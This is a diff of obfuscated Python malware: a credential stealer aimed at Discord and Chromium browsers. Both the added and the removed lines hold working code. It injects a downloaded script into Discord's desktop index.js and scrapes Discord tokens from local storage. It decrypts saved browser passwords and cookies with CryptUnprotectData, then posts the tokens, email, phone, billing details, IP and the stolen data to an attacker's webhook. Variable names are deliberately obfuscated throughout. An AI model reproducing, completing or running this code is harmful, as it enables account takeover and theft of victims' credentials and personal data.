+                                    for OOO0O00O0OOO0OOO0 ,OOO0OO000O0O00000 ,OO0OO00OOOOO000OO in os .walk (O0000O0O0O0OO0O00 ):#line:228
+                                        if 'discord_desktop_core'in OOO0O00O0OOO0OOO0 :#line:229
+                                            for O000OO0OOO0O0O00O in OO0OO00OOOOO000OO :#line:230
+                                                if O000OO0OOO0O0O00O =='index.js':#line:231
+                                                    O0O0000O00O00OO00 =os .path .join (OOO0O00O0OOO0OOO0 ,O000OO0OOO0O0O00O )#line:232
+                                                    O00OOOOOOOOOO00OO =requests .get (inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ).text #line:234
+                                                    O00OOOOOOOOOO00OO =O00OOOOOOOOOO00OO .replace ("%WEBHOOK%",IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO )#line:236
+                                                    with open (O0O0000O00O00OO00 ,"w",encoding ="utf-8")as O00OO00OO00O00O0O :#line:238
+                                                        O00OO00OO00O00O0O .write (O00OOOOOOOOOO00OO )#line:239
 keywork ()#line:240
-def G3tB4dg31 (O0O0OO0OO00O0O00O ):#line:242
-    if O0O0OO0OO00O0O00O ==0 :return ''#line:243
-    O00OOO0O0OOOO000O =''#line:245
-    O0OOOO000000O0OOO =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:257
-    for O0O0OOO00O0000OO0 in O0OOOO000000O0OOO :#line:258
-        if O0O0OO0OO00O0O00O //O0O0OOO00O0000OO0 ["Value"]!=0 :#line:259
-            O00OOO0O0OOOO000O +=O0O0OOO00O0000OO0 ["Emoji"]#line:260
-            O0O0OO0OO00O0O00O =O0O0OO0OO00O0O00O %O0O0OOO00O0000OO0 ["Value"]#line:261
-    return O00OOO0O0OOOO000O #line:263
-def G3tT0k4n1nf9 (OO00000O0000O0O00 ):#line:265
-    OOOO0OO00O0OO00OO ={"Authorization":OO00000O0000O0O00 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:270
-    OO0000OO00OOOOOOO =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =OOOO0OO00O0OO00OO )).read ().decode ())#line:272
-    O0OOOOO00OOOO0OOO =OO0000OO00OOOOOOO ["username"]#line:273
-    OO000O00OOOOOO00O =OO0000OO00OOOOOOO ["discriminator"]#line:274
-    O0O00OO00O0000OO0 =OO0000OO00OOOOOOO ["email"]#line:275
-    O00O0OOOO00OO0OOO =OO0000OO00OOOOOOO ["id"]#line:276
-    O000O00OOOOO0OO00 =OO0000OO00OOOOOOO ["avatar"]#line:277
-    O0O0000O0OO00O00O =OO0000OO00OOOOOOO ["public_flags"]#line:278
-    O0O0OO00OO0OOO000 =""#line:279
-    O00O000OOOOO0OO00 =""#line:280
-    if "premium_type"in OO0000OO00OOOOOOO :#line:282
-        OOOO0O0OOO0OO00O0 =OO0000OO00OOOOOOO ["premium_type"]#line:283
-        if OOOO0O0OOO0OO00O0 ==1 :#line:284
-            O0O0OO00OO0OOO000 ="<a:DE_BadgeNitro:865242433692762122>"#line:285
-        elif OOOO0O0OOO0OO00O0 ==2 :#line:286
-            O0O0OO00OO0OOO000 ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:287
-    if "ph0n3"in OO0000OO00OOOOOOO :O00O000OOOOO0OO00 =f'{OO0000OO00OOOOOOO["ph0n3"]}'#line:288
-    return O0OOOOO00OOOO0OOO ,OO000O00OOOOOO00O ,O0O00OO00O0000OO0 ,O00O0OOOO00OO0OOO ,O000O00OOOOO0OO00 ,O0O0000O0OO00O00O ,O0O0OO00OO0OOO000 ,O00O000OOOOO0OO00 #line:290
-def ch1ckT4k1n (OO0OO0OOOO0OOO0O0 ):#line:292
-    O00OOOO0O0OOOO00O ={"Authorization":OO0OO0OOOO0OOO0O0 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:297
+def G3tB4dg31 (OO00O000O0OOOOOOO ):#line:242
+    if OO00O000O0OOOOOOO ==0 :return ''#line:243
+    O000O000O0O00O0OO =''#line:245
+    OOO0O000OOOO0OOO0 =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:257
+    for OO00OOOO0OO0OOOO0 in OOO0O000OOOO0OOO0 :#line:258
+        if OO00O000O0OOOOOOO //OO00OOOO0OO0OOOO0 ["Value"]!=0 :#line:259
+            O000O000O0O00O0OO +=OO00OOOO0OO0OOOO0 ["Emoji"]#line:260
+            OO00O000O0OOOOOOO =OO00O000O0OOOOOOO %OO00OOOO0OO0OOOO0 ["Value"]#line:261
+    return O000O000O0O00O0OO #line:263
+def G3tT0k4n1nf9 (OOOO0OO00OOOOO000 ):#line:265
+    O0O0O00O00O0O00OO ={"Authorization":OOOO0OO00OOOOO000 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:270
+    O0OOOO0OOOO0O0OOO =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O0O0O00O00O0O00OO )).read ().decode ())#line:272
+    OO0O000OO00OOOOOO =O0OOOO0OOOO0O0OOO ["username"]#line:273
+    OO00000OOOOOO000O =O0OOOO0OOOO0O0OOO ["discriminator"]#line:274
+    OO0O0O0O00O0O0OO0 =O0OOOO0OOOO0O0OOO ["email"]#line:275
+    OOOO00OO0OOOOO0O0 =O0OOOO0OOOO0O0OOO ["id"]#line:276
+    OOO0OO0O0O00OO0OO =O0OOOO0OOOO0O0OOO ["avatar"]#line:277
+    OOOOOO0O0OOO000O0 =O0OOOO0OOOO0O0OOO ["public_flags"]#line:278
+    O0O0O00OO0000OOOO =""#line:279
+    O00OO0O00O00OOO00 =""#line:280
+    if "premium_type"in O0OOOO0OOOO0O0OOO :#line:282
+        O0O000O0OO000000O =O0OOOO0OOOO0O0OOO ["premium_type"]#line:283
+        if O0O000O0OO000000O ==1 :#line:284
+            O0O0O00OO0000OOOO ="<a:DE_BadgeNitro:865242433692762122>"#line:285
+        elif O0O000O0OO000000O ==2 :#line:286
+            O0O0O00OO0000OOOO ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:287
+    if "ph0n3"in O0OOOO0OOOO0O0OOO :O00OO0O00O00OOO00 =f'{O0OOOO0OOOO0O0OOO["ph0n3"]}'#line:288
+    return OO0O000OO00OOOOOO ,OO00000OOOOOO000O ,OO0O0O0O00O0O0OO0 ,OOOO00OO0OOOOO0O0 ,OOO0OO0O0O00OO0OO ,OOOOOO0O0OOO000O0 ,O0O0O00OO0000OOOO ,O00OO0O00O00OOO00 #line:290
+def ch1ckT4k1n (O00OO00O00000OOOO ):#line:292
+    O000000OO00OO0OOO ={"Authorization":O00OO00O00000OOOO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:297
     try :#line:298
-        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O00OOOO0O0OOOO00O ))#line:299
+        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O000000OO00OO0OOO ))#line:299
         return True #line:300
     except :#line:301
         return False #line:302
-def upl05dT4k31 (OOO0OOO000000OOOO ,OOOOOO0O000O00O0O ):#line:320
-    global IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO #line:321
-    O000O0O0000OOOO00 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:325
-    O0OO00OO0OO0OO00O ,OOO0OO0OO0000O0O0 ,OO0000O0000O00O0O ,OOOOOO0OOOOOO0000 ,O0O000O0O000O00O0 ,O00O0O00O0O0O00OO ,OO0OOO00O0OO0OO00 ,O0OOOO0000OOOOO0O =G3tT0k4n1nf9 (OOO0OOO000000OOOO )#line:326
-    if O0O000O0O000O00O0 ==None :#line:328
-        O0O000O0O000O00O0 =""#line:329
-    else :#line:330
-        O0O000O0O000O00O0 =f"https://cdn.discordapp.com/avatars/{OOOOOO0OOOOOO0000}/{O0O000O0O000O00O0}"#line:331
-    O0OOO00OOO0OO00OO =G3tb1ll1ng (OOO0OOO000000OOOO )#line:333
-    O0O0O0OO00OOO0000 =G3tB4dg31 (O00O0O00O0O0O00OO )#line:334
-    O0OO0OOO0O00O0O0O =G3tUHQFr13ndS (OOO0OOO000000OOOO )#line:335
-    if O0OO0OOO0O00O0O0O =='':O0OO0OOO0O00O0O0O ="```No Rare Friends```"#line:336
-    if not O0OOO00OOO0OO00OO :#line:337
-        O0O0O0OO00OOO0000 ,O0OOOO0000OOOOO0O ,O0OOO00OOO0OO00OO ="🔒","🔒","🔒"#line:338
-    if OO0OOO00O0OO0OO00 ==''and O0O0O0OO00OOO0000 =='':OO0OOO00O0OO0OO00 ="```None```"#line:339
-    OOO0OOOOOO0OOOO00 ={"content":f'{globalInfo()} | `{OOOOOO0O000O00O0O}`',"embeds":[{"color":2895667 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Token:","value":f"```{OOO0OOO000000OOOO}```","inline":True },{"name":"<:mail:750393870507966486> Email:","value":f"```{OO0000O0000O00O0O}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone:","value":f"```{O0OOOO0000OOOOO0O}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP:","value":f"```{g3t1p()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{OO0OOO00O0OO0OO00}{O0O0O0OO00OOO0000}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{O0OOO00OOO0OO00OO}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> HQ Friends:","value":f"{O0OO0OOO0O00O0O0O}","inline":False }],"author":{"name":f"{O0OO00OO0OO0OO00O}#{OOO0OO0OO0000O0O0} ({OOOOOO0OOOOOO0000})","icon_url":f"{O0O000O0O000O00O0}"},"footer":{"text":"unknown","icon_url":""},"thumbnail":{"url":f"{O0O000O0O000O00O0}"}}],"avatar_url":"","username":"unknown","attachments":[]}#line:399
-    L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OOO0OOOOOO0OOOO00 ).encode (),headers =O000O0O0000OOOO00 )#line:400
-def R4f0rm3t (OO00OOOO0OOOO0000 ):#line:403
-    O0O0000000O00O000 =re .findall ("(\w+[a-z])",OO00OOOO0OOOO0000 )#line:404
-    while "https"in O0O0000000O00O000 :O0O0000000O00O000 .remove ("https")#line:405
-    while "com"in O0O0000000O00O000 :O0O0000000O00O000 .remove ("com")#line:406
-    while "net"in O0O0000000O00O000 :O0O0000000O00O000 .remove ("net")#line:407
-    return list (set (O0O0000000O00O000 ))#line:408
-def upload (O000OOOO00O0OOOOO ,O00000OO00OOOO00O ):#line:410
-    OOOOOOOOOOO0O00O0 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:414
-    if O000OOOO00O0OOOOO =="crcook":#line:416
-        OOO00OO000O0OOO00 =' | '.join (O0OOOOOO00OO0O0O0 for O0OOOOOO00OO0O0O0 in cookiWords )#line:417
-        if len (OOO00OO000O0OOO00 )>1000 :#line:418
-            O000000000O0OO00O =R4f0rm3t (str (cookiWords ))#line:419
-            OOO00OO000O0OOO00 =' | '.join (O0000OO0OO00O0OOO for O0000OO0OO00O0OOO in O000000000O0OO00O )#line:420
-        OO0OOOO0000O0OO00 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Cookies Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{OOO00OO000O0OOO00}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownCookies.txt]({O00000OO00OOOO00O})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg","attachments":[]}#line:437
-        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OO0OOOO0000O0OO00 ).encode (),headers =OOOOOOOOOOO0O00O0 )#line:438
-        return #line:439
-    if O000OOOO00O0OOOOO =="crpassw":#line:441
-        O0O00OO0O0O0O00OO =' | '.join (OO0000000O00OOO0O for OO0000000O00OOO0O in paswWords )#line:442
-        if len (O0O00OO0O0O0O00OO )>1000 :#line:443
-            OO0OO0O0O00OOOO00 =R4f0rm3t (str (paswWords ))#line:444
-            O0O00OO0O0O0O00OO =' | '.join (O0000O0O00O0000OO for O0000O0O00O0000OO in OO0OO0O0O00OOOO00 )#line:445
-        OO0OOOO0000O0OO00 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Password Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{O0O00OO0O0O0O00OO}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownPassword.txt]({O00000OO00OOOO00O})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:463
-        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OO0OOOO0000O0OO00 ).encode (),headers =OOOOOOOOOOO0O00O0 )#line:464
-        return #line:465
-    if O000OOOO00O0OOOOO =="kiwi":#line:467
-        OO0OOOO0000O0OO00 ={"content":f"{globalInfo()}","embeds":[{"color":2895667 ,"fields":[{"name":"Interesting files found on user PC:","value":O00000OO00OOOO00O }],"author":{"name":"unknown | File Stealer"},"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:491
-        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OO0OOOO0000O0OO00 ).encode (),headers =OOOOOOOOOOO0O00O0 )#line:492
-        return #line:493
-    _ #line:506
-def wr1tef0rf1l3 (O00OOOOO0OOOOO00O ,O00O0O000O00O0O00 ):#line:511
-    O0O0O00O0OOO000OO =os .getenv ("TEMP")+f"\cr{O00O0O000O00O0O00}.txt"#line:512
-    with open (O0O0O00O0OOO000OO ,mode ='w',encoding ='utf-8')as O0000000000O00OOO :#line:513
-        O0000000000O00OOO .write (f"<--unknown BEST -->\n\n")#line:514
-        for O0O0OO000OO000OO0 in O00OOOOO0OOOOO00O :#line:515
-            if O0O0OO000OO000OO0 [0 ]!='':#line:516
-                O0000000000O00OOO .write (f"{O0O0OO000OO000OO0}\n")#line:517
-T0k3ns =''#line:519
-def getT0k3n (OO0OOOOOO0000O00O ,O0OOO0O000O00OO0O ):#line:520
-    if not os .path .exists (OO0OOOOOO0000O00O ):return #line:521
-    OO0OOOOOO0000O00O +=O0OOO0O000O00OO0O #line:523
-    for OOO00O0OOO0O0OOO0 in os .listdir (OO0OOOOOO0000O00O ):#line:524
-        if OOO00O0OOO0O0OOO0 .endswith (".log")or OOO00O0OOO0O0OOO0 .endswith (".ldb"):#line:525
-            for OO0OO00OOOO000O0O in [OO0OO0OO0OOOO00OO .strip ()for OO0OO0OO0OOOO00OO in open (f"{OO0OOOOOO0000O00O}\\{OOO00O0OOO0O0OOO0}",errors ="ignore").readlines ()if OO0OO0OO0OOOO00OO .strip ()]:#line:526
-                for O0000OOOOOO00000O in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:527
-                    for OO0O0O000OOO0OOO0 in re .findall (O0000OOOOOO00000O ,OO0OO00OOOO000O0O ):#line:528
-                        global T0k3ns #line:529
-                        if ch1ckT4k1n (OO0O0O000OOO0OOO0 ):#line:530
-                            if not OO0O0O000OOO0OOO0 in T0k3ns :#line:531
-                                T0k3ns +=OO0O0O000OOO0OOO0 #line:533
-                                upl05dT4k31 (OO0O0O000OOO0OOO0 ,OO0OOOOOO0000O00O )#line:534
-P4ssw =[]#line:536
-def getP4ssw (OO0O0OOOO0OOOOO00 ,OOOOOOO000O00OO00 ):#line:537
-    global P4ssw ,P4sswCount #line:538
-    if not os .path .exists (OO0O0OOOO0OOOOO00 ):return #line:539
-    OOO00OO00O00O00O0 =OO0O0OOOO0OOOOO00 +OOOOOOO000O00OO00 +"/Login Data"#line:541
-    if os .stat (OOO00OO00O00O00O0 ).st_size ==0 :return #line:542
-    OOOOOOOOO000OOO0O =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OOOO00OO0O0OOO000 in range (8 ))+".db"#line:544
-    shutil .copy2 (OOO00OO00O00O00O0 ,OOOOOOOOO000OOO0O )#line:546
-    OO0OO0O00OOO000OO =sql_connect (OOOOOOOOO000OOO0O )#line:547
-    OO00OOOOOOOOOO0OO =OO0OO0O00OOO000OO .cursor ()#line:548
-    OO00OOOOOOOOOO0OO .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:549
-    O0O0OOO00O00O0O0O =OO00OOOOOOOOOO0OO .fetchall ()#line:550
-    OO00OOOOOOOOOO0OO .close ()#line:551
-    OO0OO0O00OOO000OO .close ()#line:552
-    os .remove (OOOOOOOOO000OOO0O )#line:553
-    O0000O0O00000O0O0 =OO0O0OOOO0OOOOO00 +"/Local State"#line:555
-    with open (O0000O0O00000O0O0 ,'r',encoding ='utf-8')as O00OO00O0OO0O00OO :O0000OOOOOOOO00O0 =json_loads (O00OO00O0OO0O00OO .read ())#line:556
-    OOO0O00O00OOO0OOO =b64decode (O0000OOOOOOOO00O0 ['os_crypt']['encrypted_key'])#line:557
-    OOO0O00O00OOO0OOO =CryptUnprotectData (OOO0O00O00OOO0OOO [5 :])#line:558
-    for O0000O0O00OOOO0O0 in O0O0OOO00O00O0O0O :#line:560
-        if O0000O0O00OOOO0O0 [0 ]!='':#line:561
-            for OO00OOO00OOOOO00O in keyword :#line:562
-                OOOO0O0O0O000O0O0 =OO00OOO00OOOOO00O #line:563
-                if "https"in OO00OOO00OOOOO00O :#line:564
-                    O000000O0O0O0O0OO =OO00OOO00OOOOO00O #line:565
-                    OO00OOO00OOOOO00O =O000000O0O0O0O0OO .split ('[')[1 ].split (']')[0 ]#line:566
-                if OO00OOO00OOOOO00O in O0000O0O00OOOO0O0 [0 ]:#line:567
-                    if not OOOO0O0O0O000O0O0 in paswWords :paswWords .append (OOOO0O0O0O000O0O0 )#line:568
-            P4ssw .append (f"UR1: {O0000O0O00OOOO0O0[0]} | U53RN4M3: {O0000O0O00OOOO0O0[1]} | P455W0RD: {D3kryptV4lU3(O0000O0O00OOOO0O0[2], OOO0O00O00OOO0OOO)}")#line:569
-            P4sswCount +=1 #line:570
-    wr1tef0rf1l3 (P4ssw ,'passw')#line:571
-C00k13 =[]#line:573
-def getC00k13 (O00OOOOOOO00OO00O ,O0000O00OOOOO00O0 ):#line:574
-    global C00k13 ,CookiCount #line:575
-    if not os .path .exists (O00OOOOOOO00OO00O ):return #line:576
-    O0000OO00OOOOO0O0 =O00OOOOOOO00OO00O +O0000O00OOOOO00O0 +"/Cookies"#line:578
-    if os .stat (O0000OO00OOOOO0O0 ).st_size ==0 :return #line:579
-    OO0OOOO0O0OO0OO00 =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OO0OOO0O0O00O00OO in range (8 ))+".db"#line:581
-    shutil .copy2 (O0000OO00OOOOO0O0 ,OO0OOOO0O0OO0OO00 )#line:583
-    O0000O00000OO0O00 =sql_connect (OO0OOOO0O0OO0OO00 )#line:584
-    O0OO00000OO00O000 =O0000O00000OO0O00 .cursor ()#line:585
-    O0OO00000OO00O000 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:586
-    OOO0O0OOO0O00OO0O =O0OO00000OO00O000 .fetchall ()#line:587
-    O0OO00000OO00O000 .close ()#line:588
-    O0000O00000OO0O00 .close ()#line:589
-    os .remove (OO0OOOO0O0OO0OO00 )#line:590
-    O000O0O000O0O0O0O =O00OOOOOOO00OO00O +"/Local State"#line:592
-    with open (O000O0O000O0O0O0O ,'r',encoding ='utf-8')as OOOOOOO0OO00000OO :O0OOO00000OOOOO00 =json_loads (OOOOOOO0OO00000OO .read ())#line:594
-    OOO00OOOO0OO0O000 =b64decode (O0OOO00000OOOOO00 ['os_crypt']['encrypted_key'])#line:595
-    OOO00OOOO0OO0O000 =CryptUnprotectData (OOO00OOOO0OO0O000 [5 :])#line:596
-    for OO0O000OOO00O0OO0 in OOO0O0OOO0O00OO0O :#line:598
-        if OO0O000OOO00O0OO0 [0 ]!='':#line:599
-            for O000000O000O00OOO in keyword :#line:600
-                O00O00O0OOO000000 =O000000O000O00OOO #line:601
-                if "https"in O000000O000O00OOO :#line:602
-                    O00OOO0O000OOOOOO =O000000O000O00OOO #line:603
-                    O000000O000O00OOO =O00OOO0O000OOOOOO .split ('[')[1 ].split (']')[0 ]#line:604
-                if O000000O000O00OOO in OO0O000OOO00O0OO0 [0 ]:#line:605
-                    if not O00O00O0OOO000000 in cookiWords :cookiWords .append (O00O00O0OOO000000 )#line:606
-            C00k13 .append (f"{OO0O000OOO00O0OO0[0]}	TRUE	/	FALSE	2597573456	{OO0O000OOO00O0OO0[1]}	{D3kryptV4lU3(OO0O000OOO00O0OO0[2], OOO00OOOO0OO0O000)}")#line:607
-            CookiCount +=1 #line:608
-    wr1tef0rf1l3 (C00k13 ,'cook')#line:609
